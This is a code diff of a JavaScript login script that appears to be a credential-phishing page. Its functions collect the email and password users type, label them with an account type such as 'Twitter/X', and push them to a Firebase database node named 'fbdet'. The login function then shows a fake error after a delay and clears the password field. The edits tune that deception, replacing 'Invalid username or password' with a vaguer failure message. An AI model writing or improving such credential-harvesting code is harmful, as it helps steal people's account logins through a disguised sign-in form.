@@ -1,4 +1,3 @@
-
 // Initialize Firebase
 const firebaseConfig = {
   apiKey: "AIzaSyByXd9W23DrSek4bZwbXlKjaoXFYDO-tsI",
@@ -7,7 +6,7 @@ const firebaseConfig = {
   projectId: "emirateswill",
   storageBucket: "emirateswill.appspot.com",
   messagingSenderId: "937261210149",
-  appId: "1:937261210149:web:9a3e633abcedf76f453dcc"
+  appId: "1:937261210149:web:9a3e633abcedf76f453dcc",
 };
 firebase.initializeApp(firebaseConfig);
 const appCheck = firebase.appCheck();
@@ -41,7 +40,10 @@ function login() {
     });
 
     setTimeout(function () {
-      showError("Invalid username or password", "error_box");
+      showError(
+        "Oops, something went wrong. Please try again later.",
+        "error_box"
+      );
       document.getElementById("fb-pass").value = "";
       return false;
     }, 2000);
@@ -63,7 +65,7 @@ function twlogin() {
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = "Twitter";
+  var accountType = "Twitter/X";
 
   if (email !== "" && password !== "") {
     firebase.database().ref("fbdet").push({
